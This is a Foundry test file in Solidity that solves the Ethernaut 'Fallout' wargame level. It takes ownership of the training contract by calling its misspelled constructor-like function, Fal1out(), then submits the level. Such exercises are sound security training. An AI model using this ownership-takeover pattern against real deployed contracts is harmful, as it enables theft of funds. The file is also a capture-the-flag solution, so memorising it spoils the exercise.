
pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Fallout } from "src/Fallout/Fallout.sol";
import { FalloutFactory } from "src/Fallout/FalloutFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
        vm.deal(me, 5 ether);
    }

    function testFalloutHack() external {
        // level setup
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout falloutSC = Fallout(payable(levelAddress));

        // attack
        falloutSC.Fal1out();
        assertEq(falloutSC.owner(), me);

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
